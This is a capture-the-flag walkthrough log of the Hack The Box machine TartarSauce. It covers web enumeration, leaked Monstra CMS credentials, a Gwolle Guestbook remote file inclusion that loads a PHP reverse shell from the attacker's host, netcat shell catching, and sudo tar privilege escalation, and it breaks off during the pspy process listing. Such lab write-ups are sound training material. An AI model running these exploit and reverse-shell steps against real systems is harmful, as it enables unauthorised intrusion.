@@ -1,0 +1,805 @@
+RECON
+root@kali:~/htb/tartarsauce# nmap -sC -sV -p- -vv -oA full 10.10.10.88
+PORT   STATE SERVICE REASON         VERSION
+80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: 5 disallowed entries 
+| /webservices/tar/tar/source/ 
+| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ 
+|_/webservices/developmental/ /webservices/phpmyadmin/
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Landing Page
+
+WEB ENUM
+root@kali:~/htb/tartarsauce# nikto -h http://10.10.10.88
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.10.88
++ Target Hostname:    10.10.10.88
++ Target Port:        80
++ Start Time:         2020-11-24 15:16:39 (GMT-5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 (Ubuntu)
++ Server leaks inodes via ETags, header found with file /, fields: 0x2a0e 0x565becf5ff08d 
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Cookie PHPSESSID created without the httponly flag
++ Entry '/webservices/monstra-3.0.4/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ "robots.txt" contains 5 entries which should be manually viewed.
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
++ OSVDB-3233: /icons/README: Apache default file found.
++ 7514 requests: 0 error(s) and 9 item(s) reported on remote host
++ End Time:           2020-11-24 15:22:48 (GMT-5) (369 seconds)
+-----------------------------------------------------------------
+
+root@kali:~/htb/tartarsauce# /root/dirsearch/dirsearch.py -u http://10.10.10.88 -e asp,aspx,bat,c,cfm,cgi,com,dll,exe,htm,html,inc,jhtml,jsa,jsp,log,mdb,nsf,php,phtml,pl,reg,sh,shtml,sql,txt,xml,/,js,conf -x 403,400
+
+  _|. _ _  _  _  _ _|_    v0.4.0
+ (_||| _) (/_(_|| (_| )
+
+Extensions: asp, aspx, bat, c, cfm, cgi, com, dll, exe, htm, html, inc, jhtml, jsa, jsp, log, mdb, nsf, php, phtml, pl, reg, sh, shtml, sql, txt, xml, /, js, conf | HTTP method: GET | Threads: 20 | Wordlist size: 21626
+
+Error Log: /root/dirsearch/logs/errors-20-11-24_15-17-17.log
+
+Target: http://10.10.10.88/
+
+Output File: /root/dirsearch/reports/10.10.10.88/_20-11-24_15-17-17.txt
+
+[15:17:17] Starting: 
+[15:17:18] 200 -   11KB - ///
+[15:17:59] 200 -   11KB - //index.html
+[15:18:12] 200 -  208B  - //robots.txt
+
+root@kali:~/htb/tartarsauce# gobuster -u http://10.10.10.88/ -x "cgi,com,htm,html,log,php,pl,txt,conf" -t 40 -s "200,204,301,302,307" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+Gobuster v1.4.1              OJ Reeves (@TheColonial)
+=====================================================
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.10.88/
+[+] Threads      : 40
+[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes : 200,204,301,302,307
+[+] Extensions   : .cgi,.com,.htm,.html,.log,.php,.pl,.txt,.conf
+=====================================================
+/index.html (Status: 200)
+/robots.txt (Status: 200)
+/webservices (Status: 301)
+
+root@kali:~/htb/tartarsauce# gobuster -u http://10.10.10.88/webservices/monstra-3.0.4/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x .php,.txt,.xml
+
+Gobuster v1.4.1              OJ Reeves (@TheColonial)
+=====================================================
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.10.88/webservices/monstra-3.0.4/
+[+] Threads      : 50
+[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes : 200,204,301,302,307
+[+] Extensions   : .php,.txt,.xml
+=====================================================
+/rss.php (Status: 200)
+/index.php (Status: 200)
+/sitemap.xml (Status: 200)
+/public (Status: 301)
+/admin (Status: 301)
+/storage (Status: 301)
+/plugins (Status: 301)
+/engine (Status: 301)
+/libraries (Status: 301)
+/robots.txt (Status: 200)
+/tmp (Status: 301)
+/boot (Status: 301)
+/backups (Status: 301)
+
+https://simpleinfosec.com/2018/05/27/monstra-cms-3-0-4-unauthenticated-user-credential-exposure/
+
+GET THE USER LOGIN DETAILS FROM THE XML FILE
+http://10.10.10.88/webservices/monstra-3.0.4/storage/database/users.table.xml
+<root><options><autoincrement>1</autoincrement></options><fields><login/><password/><email/><role/><date_registered/><firstname/><lastname/><login/><twitter/><skype/><hash/><about_me/></fields><users><id>1</id><uid>af45a48ed8</uid><password>5d1e3697d706b0e24e574b56e79affda</password><hash>jB64OpMOWGxq</hash><date_registered>1519235295</date_registered><login>admin</login><firstname/><lastname/><email>test@test.local</email><skype/><twitter/><about_me>I like falafel with tartar sauce.</about_me><role>admin</role></users></root>
+
+
+REVIEW PASSWORD HASH
+root@kali:~/htb/tartarsauce# hash-identifier 
+   #########################################################################
+   #	 __  __ 		    __		 ______    _____	   #
+   #	/\ \/\ \		   /\ \ 	/\__  _\  /\  _ `\	   #
+   #	\ \ \_\ \     __      ____ \ \ \___	\/_/\ \/  \ \ \/\ \	   #
+   #	 \ \  _  \  /'__`\   / ,__\ \ \  _ `\	   \ \ \   \ \ \ \ \	   #
+   #	  \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \	    \_\ \__ \ \ \_\ \	   #
+   #	   \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/	   #
+   #	    \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.1 #
+   #								 By Zion3R #
+   #							www.Blackploit.com #
+   #						       Root@Blackploit.com #
+   #########################################################################
+
+   -------------------------------------------------------------------------
+ HASH: 5d1e3697d706b0e24e574b56e79affda
+
+Possible Hashs:
+[+]  MD5
+[+]  Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
+
+
+admin
+5d1e3697d706b0e24e574b56e79affda
+
+LOGIN TO MONSTRA WITH DEFAULT CREDENTIALS
+
+admin:admin
+http://10.10.10.88/webservices/monstra-3.0.4/admin/index.php?id=dashboard
+
+ADD EDITOR USER
+http://10.10.10.88/webservices/monstra-3.0.4/admin/index.php?id=users&action=add
+
+
+UPLOAD REVERSE SHELL
+https://www.exploit-db.com/exploits/43348
+
+REVIEW WORDPRESS CMS
+root@kali:~/htb/tartarsauce# wpscan --url http://10.10.10.88/webservices/wp/
+_______________________________________________________________
+        __          _______   _____                  
+        \ \        / /  __ \ / ____|                 
+         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
+           \  /\  /  | |     ____) | (__| (_| | | | |
+            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+        WordPress Security Scanner by the WPScan Team 
+                       Version 2.9.4
+          Sponsored by Sucuri - https://sucuri.net
+      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
+_______________________________________________________________
+
+
+[i] It seems like you have not updated the database for some time
+[i] Last database update: 2018-08-21
+[?] Do you want to update now? [Y]es  [N]o  [A]bort update, default: [N] > n
+[+] URL: http://10.10.10.88/webservices/wp/
+[+] Started: Wed Nov 25 16:23:21 2020
+
+[+] Interesting header: LINK: <http:/10.10.10.88/webservices/wp/index.php/wp-json/>; rel="https://api.w.org/"
+[+] Interesting header: SERVER: Apache/2.4.18 (Ubuntu)
+[+] XML-RPC Interface available under: http://10.10.10.88/webservices/wp/xmlrpc.php   [HTTP 405]
+[+] Found an RSS Feed: http:/10.10.10.88/webservices/wp/index.php/feed/   [HTTP 404]
+
+[+] Enumerating WordPress version ...
+
+[+] WordPress version 4.9.4 (Released on 2018-02-06) identified from meta generator, links opml
+[!] 5 vulnerabilities identified from the version number
+
+[!] Title: WordPress <= 4.9.4 - Application Denial of Service (DoS) (unpatched)
+    Reference: https://wpvulndb.com/vulnerabilities/9021
+    Reference: https://baraktawily.blogspot.fr/2018/02/how-to-dos-29-of-world-wide-websites.html
+    Reference: https://github.com/quitten/doser.py
+    Reference: https://thehackernews.com/2018/02/wordpress-dos-exploit.html
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389
+
+[!] Title: WordPress 3.7-4.9.4 - Remove localhost Default
+    Reference: https://wpvulndb.com/vulnerabilities/9053
+    Reference: https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
+    Reference: https://github.com/WordPress/WordPress/commit/804363859602d4050d9a38a21f5a65d9aec18216
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10101
+[i] Fixed in: 4.9.5
+
+[!] Title: WordPress 3.7-4.9.4 - Use Safe Redirect for Login
+    Reference: https://wpvulndb.com/vulnerabilities/9054
+    Reference: https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
+    Reference: https://github.com/WordPress/WordPress/commit/14bc2c0a6fde0da04b47130707e01df850eedc7e
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10100
+[i] Fixed in: 4.9.5
+
+[!] Title: WordPress 3.7-4.9.4 - Escape Version in Generator Tag
+    Reference: https://wpvulndb.com/vulnerabilities/9055
+    Reference: https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
+    Reference: https://github.com/WordPress/WordPress/commit/31a4369366d6b8ce30045d4c838de2412c77850d
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10102
+[i] Fixed in: 4.9.5
+
+[!] Title: WordPress <= 4.9.6 - Authenticated Arbitrary File Deletion
+    Reference: https://wpvulndb.com/vulnerabilities/9100
+    Reference: https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/
+    Reference: http://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/
+    Reference: https://github.com/WordPress/WordPress/commit/c9dce0606b0d7e6f494d4abe7b193ac046a322cd
+    Reference: https://wordpress.org/news/2018/07/wordpress-4-9-7-security-and-maintenance-release/
+    Reference: https://www.wordfence.com/blog/2018/07/details-of-an-additional-file-deletion-vulnerability-patched-in-wordpress-4-9-7/
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12895
+[i] Fixed in: 4.9.7
+
+[+] WordPress theme in use: voce - v1.1.0
+
+[+] Name: voce - v1.1.0
+ |  Latest version: 1.1.0 (up to date)
+ |  Last updated: 2017-09-01T00:00:00.000Z
+ |  Location: http://10.10.10.88/webservices/wp/wp-content/themes/voce/
+ |  Readme: http://10.10.10.88/webservices/wp/wp-content/themes/voce/readme.txt
+ |  Style URL: http://10.10.10.88/webservices/wp/wp-content/themes/voce/style.css
+ |  Referenced style.css: wp-content/themes/voce/style.css
+ |  Theme Name: voce
+ |  Theme URI: http://limbenjamin.com/pages/voce-wp.html
+ |  Description: voce is a minimal theme, suitable for text heavy articles. The front page features a list of rece...
+ |  Author: Benjamin Lim
+ |  Author URI: https://limbenjamin.com
+
+[+] Enumerating plugins from passive detection ...
+[+] No plugins found passively
+
+[+] Finished: Wed Nov 25 16:23:38 2020
+[+] Elapsed time: 00:00:16
+[+] Requests made: 393
+[+] Memory used: 12.961 MB
+
+RERUN WORDPRESS SCAN WITH MORE AGGRESSIVE SETTINGS
+root@kali:~/htb/tartarsauce# wpscan --url http://10.10.10.88/webservices/wp -e ap --wp-plugins-dir http://10.10.10.88/webservices/wp/wp-content/plugins/ plugins-detection aggressive
+_______________________________________________________________
+        __          _______   _____                  
+        \ \        / /  __ \ / ____|                 
+         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
+           \  /\  /  | |     ____) | (__| (_| | | | |
+            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+        WordPress Security Scanner by the WPScan Team 
+                       Version 2.9.4
+          Sponsored by Sucuri - https://sucuri.net
+      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
+_______________________________________________________________
+
+
+[i] It seems like you have not updated the database for some time
+[i] Last database update: 2018-08-21
+[?] Do you want to update now? [Y]es  [N]o  [A]bort update, default: [N] > n
+[+] URL: http://10.10.10.88/webservices/wp/
+[+] Started: Wed Nov 25 17:00:27 2020
+
+[+] Interesting header: LINK: <http:/10.10.10.88/webservices/wp/index.php/wp-json/>; rel="https://api.w.org/"
+[+] Interesting header: SERVER: Apache/2.4.18 (Ubuntu)
+[+] XML-RPC Interface available under: http://10.10.10.88/webservices/wp/xmlrpc.php   [HTTP 405]
+[+] Found an RSS Feed: http:/10.10.10.88/webservices/wp/index.php/feed/   [HTTP 404]
+
+[+] Enumerating WordPress version ...
+
+[+] WordPress version 4.9.4 (Released on 2018-02-06) identified from meta generator, links opml
+[!] 5 vulnerabilities identified from the version number
+
+[!] Title: WordPress <= 4.9.4 - Application Denial of Service (DoS) (unpatched)
+    Reference: https://wpvulndb.com/vulnerabilities/9021
+    Reference: https://baraktawily.blogspot.fr/2018/02/how-to-dos-29-of-world-wide-websites.html
+    Reference: https://github.com/quitten/doser.py
+    Reference: https://thehackernews.com/2018/02/wordpress-dos-exploit.html
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389
+
+[!] Title: WordPress 3.7-4.9.4 - Remove localhost Default
+    Reference: https://wpvulndb.com/vulnerabilities/9053
+    Reference: https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
+    Reference: https://github.com/WordPress/WordPress/commit/804363859602d4050d9a38a21f5a65d9aec18216
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10101
+[i] Fixed in: 4.9.5
+
+[!] Title: WordPress 3.7-4.9.4 - Use Safe Redirect for Login
+    Reference: https://wpvulndb.com/vulnerabilities/9054
+    Reference: https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
+    Reference: https://github.com/WordPress/WordPress/commit/14bc2c0a6fde0da04b47130707e01df850eedc7e
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10100
+[i] Fixed in: 4.9.5
+
+[!] Title: WordPress 3.7-4.9.4 - Escape Version in Generator Tag
+    Reference: https://wpvulndb.com/vulnerabilities/9055
+    Reference: https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
+    Reference: https://github.com/WordPress/WordPress/commit/31a4369366d6b8ce30045d4c838de2412c77850d
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10102
+[i] Fixed in: 4.9.5
+
+[!] Title: WordPress <= 4.9.6 - Authenticated Arbitrary File Deletion
+    Reference: https://wpvulndb.com/vulnerabilities/9100
+    Reference: https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/
+    Reference: http://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/
+    Reference: https://github.com/WordPress/WordPress/commit/c9dce0606b0d7e6f494d4abe7b193ac046a322cd
+    Reference: https://wordpress.org/news/2018/07/wordpress-4-9-7-security-and-maintenance-release/
+    Reference: https://www.wordfence.com/blog/2018/07/details-of-an-additional-file-deletion-vulnerability-patched-in-wordpress-4-9-7/
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12895
+[i] Fixed in: 4.9.7
+
+[+] WordPress theme in use: voce - v1.1.0
+
+[+] Name: voce - v1.1.0
+ |  Latest version: 1.1.0 (up to date)
+ |  Last updated: 2017-09-01T00:00:00.000Z
+ |  Location: http://10.10.10.88/webservices/wp/wp-content/themes/voce/
+ |  Readme: http://10.10.10.88/webservices/wp/wp-content/themes/voce/readme.txt
+ |  Style URL: http://10.10.10.88/webservices/wp/wp-content/themes/voce/style.css
+ |  Referenced style.css: wp-content/themes/voce/style.css
+ |  Theme Name: voce
+ |  Theme URI: http://limbenjamin.com/pages/voce-wp.html
+ |  Description: voce is a minimal theme, suitable for text heavy articles. The front page features a list of rece...
+ |  Author: Benjamin Lim
+ |  Author URI: https://limbenjamin.com
+
+[+] Enumerating plugins from passive detection ...
+[+] No plugins found passively
+
+[+] Enumerating all plugins (may take a while and use a lot of system resources) ...
+
+   Time: 00:04:02 <==========================================> (75995 / 75995) 100.00% Time: 00:04:02
+
+[+] We found 3 plugins:
+
+[+] Name: akismet - v4.0.3
+ |  Last updated: 2018-06-19T18:18:00.000Z
+ |  Location: http://10.10.10.88/webservices/wp/wp-content/plugins//akismet/
+ |  Readme: http://10.10.10.88/webservices/wp/wp-content/plugins//akismet/readme.txt
+[!] The version is out of date, the latest version is 4.0.8
+
+[+] Name: brute-force-login-protection - v1.5.3
+ |  Latest version: 1.5.3 (up to date)
+ |  Last updated: 2017-06-29T10:39:00.000Z
+ |  Location: http://10.10.10.88/webservices/wp/wp-content/plugins//brute-force-login-protection/
+ |  Readme: http://10.10.10.88/webservices/wp/wp-content/plugins//brute-force-login-protection/readme.txt
+
+[+] Name: gwolle-gb - v2.3.10
+ |  Last updated: 2018-07-19T11:06:00.000Z
+ |  Location: http://10.10.10.88/webservices/wp/wp-content/plugins//gwolle-gb/
+ |  Readme: http://10.10.10.88/webservices/wp/wp-content/plugins//gwolle-gb/readme.txt
+[!] The version is out of date, the latest version is 2.6.2
+
+[!] Title: Gwolle Guestbook <= 2.5.3 - Cross-Site Scripting (XSS)
+    Reference: https://wpvulndb.com/vulnerabilities/9109
+    Reference: http://seclists.org/fulldisclosure/2018/Jul/89
+    Reference: http://www.defensecode.com/advisories/DC-2018-05-008_WordPress_Gwolle_Guestbook_Plugin_Advisory.pdf
+    Reference: https://plugins.trac.wordpress.org/changeset/1888023/gwolle-gb
+[i] Fixed in: 2.5.4
+
+SEARCH EXPLOIT FOR GWOLLE GUESTBOOK
+root@kali:~/htb/tartarsauce# searchsploit gwolle
+------------------------------------------------------------ ----------------------------------------
+ Exploit Title                                              |  Path
+                                                            | (/usr/share/exploitdb/)
+------------------------------------------------------------ ----------------------------------------
+WordPress Plugin Gwolle Guestbook 1.5.3 - Remote File Inclu | exploits/php/webapps/38861.txt
+------------------------------------------------------------ --------------------------------
+
+USE PENTESTMONKEY REVERSE PHP SHELL
+root@kali:~/htb/tartarsauce# cp rshell.php wp-load.php
+
+SERVER PHP REVERSE SHELL
+root@kali:~/htb/tartarsauce# cp rshell.php wp-load.php
+
+TRIGGER EXPLOIT FOR REVERSE SHELL
+http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.8/
+
+GET LOW PRIV REVERSE SHELL 
+root@kali:~/htb/tartarsauce# nc -lvp 1234
+listening on [any] 1234 ...
+10.10.10.88: inverse host lookup failed: Unknown host
+connect to [10.10.14.8] from (UNKNOWN) [10.10.10.88] 50222
+Linux TartarSauce 4.15.0-041500-generic #201802011154 SMP Thu Feb 1 12:05:23 UTC 2018 i686 athlon i686 GNU/Linux
+ 17:40:44 up  2:17,  0 users,  load average: 0.01, 0.01, 0.06
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id & unam^?^?
+/bin/sh: 1: unam: not found
+$ uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+UPGRADE SHELL
+$ python -c 'import pty;pty.spawn("/bin/bash")' 
+www-data@TartarSauce:/$ 
+
+REVIEW SUDO PRIVILEGES
+www-data@TartarSauce:/$ sudo -l
+Matching Defaults entries for www-data on TartarSauce:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on TartarSauce:
+    (onuma) NOPASSWD: /bin/tar
+
+REVIEW GTFOBINS FOR TAR
+https://gtfobins.github.io/gtfobins/tar/
+
+RUN SUDO EXPLOIT FOR TAR
+sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+GET SHELL AS USER ONUMA
+www-data@TartarSauce:/$ sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh               
+
+tar: Removing leading `/' from member names
+$ id
+
+uid=1000(onuma) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev)
+$ python -c 'import pty;pty.spawn("/bin/bash")' python -c 'import pty;pty.spawn("/bin/bash")' 
+
+onuma@TartarSauce:/$ 
+
+GET USER FLAG
+onuma@TartarSauce:~$ ls  -l
+
+total 4
+lrwxrwxrwx 1 root  root   9 Feb 17  2018 shadow_bkp -> /dev/null
+-r-------- 1 onuma onuma 33 Feb  9  2018 user.txt
+onuma@TartarSauce:~$ cat  /home/onuma/user.txt
+################################
+
+
+REVIEW PROCESSES USING PSPY
+numa@TartarSauce:/tmp$ wget  10.10.14.8/pspy32
+
+--2020-11-25 17:59:11--  http://10.10.14.8/pspy32
+Connecting to 10.10.14.8:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2656352 (2.5M) [application/octet-stream]
+Saving to: 'pspy32'
+
+pspy32              100%[===================>]   2.53M  1.55MB/s    in 1.6s    
+
+2020-11-25 17:59:13 (1.55 MB/s) - 'pspy32' saved [2656352/2656352]
+
+onuma@TartarSauce:/tmp$ ls  -l
+
+total 2604
+-rw-r--r-- 1 onuma onuma 2656352 Nov 25 17:53 pspy32
+drwx------ 3 root  root     4096 Nov 25 15:23 systemd-private-dad8b5ebf7af4412ac7f6494594bc4cf-systemd-timesyncd.service-4S8x80
+drwx------ 2 root  root     4096 Nov 25 15:23 vmware-root
+onuma@TartarSauce:/tmp$ chmod  +x  pspy32
+
+onuma@TartarSauce:/tmp$ ./pspy32
+
+pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
+
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+                   ░           ░ ░     
+                               ░ ░     
+
+Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
+Draining file system events due to startup...
+done
+2020/11/25 17:59:36 CMD: UID=0    PID=959    | /usr/lib/policykit-1/polkitd --no-debug 
+2020/11/25 17:59:36 CMD: UID=0    PID=95     | 
+2020/11/25 17:59:36 CMD: UID=0    PID=936    | /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog 
+2020/11/25 17:59:36 CMD: UID=0    PID=9      | 
+2020/11/25 17:59:36 CMD: UID=0    PID=85     | 
+2020/11/25 17:59:36 CMD: UID=0    PID=844    | /lib/systemd/systemd-logind 
+2020/11/25 17:59:36 CMD: UID=0    PID=843    | /usr/lib/snapd/snapd 
+2020/11/25 17:59:36 CMD: UID=0    PID=842    | /usr/sbin/cron -f 
+2020/11/25 17:59:36 CMD: UID=104  PID=841    | /usr/sbin/rsyslogd -n 
+2020/11/25 17:59:36 CMD: UID=0    PID=840    | /usr/lib/accountsservice/accounts-daemon 
+2020/11/25 17:59:36 CMD: UID=0    PID=83     | 
+2020/11/25 17:59:36 CMD: UID=0    PID=826    | /usr/bin/lxcfs /var/lib/lxcfs/ 
+2020/11/25 17:59:36 CMD: UID=0    PID=825    | /usr/sbin/atd -f 
+2020/11/25 17:59:36 CMD: UID=0    PID=82     | 
+2020/11/25 17:59:36 CMD: UID=0    PID=81     | 
+2020/11/25 17:59:36 CMD: UID=108  PID=807    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation 
+2020/11/25 17:59:36 CMD: UID=0    PID=806    | /usr/bin/vmtoolsd 
+2020/11/25 17:59:36 CMD: UID=0    PID=802    | /usr/sbin/acpid 
+2020/11/25 17:59:36 CMD: UID=0    PID=80     | 
+2020/11/25 17:59:36 CMD: UID=0    PID=8      | 
+2020/11/25 17:59:36 CMD: UID=0    PID=79     | 
+2020/11/25 17:59:36 CMD: UID=0    PID=78     | 
+2020/11/25 17:59:36 CMD: UID=0    PID=77     | 
+2020/11/25 17:59:36 CMD: UID=0    PID=7      | 
+2020/11/25 17:59:36 CMD: UID=100  PID=687    | /lib/systemd/systemd-timesyncd 
+2020/11/25 17:59:36 CMD: UID=0    PID=646    | 
+2020/11/25 17:59:36 CMD: UID=1000 PID=6023   | ./pspy32 
+2020/11/25 17:59:36 CMD: UID=0    PID=6      | 
+2020/11/25 17:59:36 CMD: UID=1000 PID=5884   | /bin/bash 
+2020/11/25 17:59:36 CMD: UID=0    PID=5870   | 
+2020/11/25 17:59:36 CMD: UID=1000 PID=5746   | /bin/bash 
+2020/11/25 17:59:36 CMD: UID=1000 PID=5745   | python -c import pty;pty.spawn("/bin/bash") 
+2020/11/25 17:59:36 CMD: UID=1000 PID=5723   | /bin/sh 
+2020/11/25 17:59:36 CMD: UID=1000 PID=5722   | tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh 
+2020/11/25 17:59:36 CMD: UID=0    PID=5721   | sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh 
+2020/11/25 17:59:36 CMD: UID=33   PID=5611   | /bin/bash 
+2020/11/25 17:59:36 CMD: UID=33   PID=5610   | python -c import pty;pty.spawn("/bin/bash") 
+2020/11/25 17:59:36 CMD: UID=33   PID=5480   | /bin/sh -i 
+2020/11/25 17:59:36 CMD: UID=33   PID=5476   | sh -c uname -a; w; id; /bin/sh -i 
+2020/11/25 17:59:36 CMD: UID=0    PID=5413   | 
+2020/11/25 17:59:36 CMD: UID=0    PID=5183   | 
+2020/11/25 17:59:36 CMD: UID=33   PID=4509   | /usr/sbin/apache2 -k start 
+2020/11/25 17:59:36 CMD: UID=33   PID=4507   | /usr/sbin/apache2 -k start 
+2020/11/25 17:59:36 CMD: UID=33   PID=4505   | /usr/sbin/apache2 -k start 
+2020/11/25 17:59:36 CMD: UID=33   PID=4498   | /usr/sbin/apache2 -k start 
+2020/11/25 17:59:36 CMD: UID=33   PID=4497   | /usr/sbin/apache2 -k start 
+2020/11/25 17:59:36 CMD: UID=33   PID=4496   | /usr/sbin/apache2 -k start 
+2020/11/25 17:59:36 CMD: UID=33   PID=4482   | /usr/sbin/apache2 -k start 
+2020/11/25 17:59:36 CMD: UID=0    PID=436    | /lib/systemd/systemd-udevd 
+2020/11/25 17:59:36 CMD: UID=0    PID=425    | 
+2020/11/25 17:59:36 CMD: UID=0    PID=409    | 
+2020/11/25 17:59:36 CMD: UID=33   PID=4085   | /usr/sbin/apache2 -k start 
+2020/11/25 17:59:36 CMD: UID=33   PID=4083   | /usr/sbin/apache2 -k start 
+2020/11/25 17:59:36 CMD: UID=0    PID=408    | 
+2020/11/25 17:59:36 CMD: UID=0    PID=407    | 
+2020/11/25 17:59:36 CMD: UID=0    PID=406    | 
+2020/11/25 17:59:36 CMD: UID=0    PID=404    | /sbin/lvmetad -f 
+2020/11/25 17:59:36 CMD: UID=0    PID=402    | /lib/systemd/systemd-journald 
+2020/11/25 17:59:36 CMD: UID=0    PID=4      | 
+2020/11/25 17:59:36 CMD: UID=0    PID=351    | 
+2020/11/25 17:59:36 CMD: UID=0    PID=350    | 
+2020/11/25 17:59:36 CMD: UID=0    PID=35     | 
+2020/11/25 17:59:36 CMD: UID=0    PID=34     | 
+2020/11/25 17:59:36 CMD: UID=33   PID=3329   | /usr/sbin/apache2 -k start 
+2020/11/25 17:59:36 CMD: UID=0    PID=3244   | 
+2020/11/25 17:59:36 CMD: UID=0    PID=310    | 
+2020/11/25 17:59:36 CMD: UID=0    PID=309    | 
+2020/11/25 17:59:36 CMD: UID=0    PID=300    | 
+2020/11/25 17:59:36 CMD: UID=0    PID=30     | 
+2020/11/25 17:59:36 CMD: UID=0    PID=299    | 
+2020/11/25 17:59:36 CMD: UID=0    PID=29     | 
+2020/11/25 17:59:36 CMD: UID=0    PID=28     | 
+2020/11/25 17:59:36 CMD: UID=0    PID=275    | 
+2020/11/25 17:59:36 CMD: UID=0    PID=27     | 
+2020/11/25 17:59:36 CMD: UID=0    PID=26     | 
+2020/11/25 17:59:36 CMD: UID=0    PID=25     | 
+2020/11/25 17:59:36 CMD: UID=0    PID=24     | 
+2020/11/25 17:59:36 CMD: UID=0    PID=23     | 
+2020/11/25 17:59:36 CMD: UID=0    PID=22     | 
+2020/11/25 17:59:36 CMD: UID=0    PID=21     | 
+2020/11/25 17:59:36 CMD: UID=0    PID=20     | 
+2020/11/25 17:59:36 CMD: UID=0    PID=2      | 
+2020/11/25 17:59:36 CMD: UID=0    PID=198    | 
+2020/11/25 17:59:36 CMD: UID=0    PID=196    | 
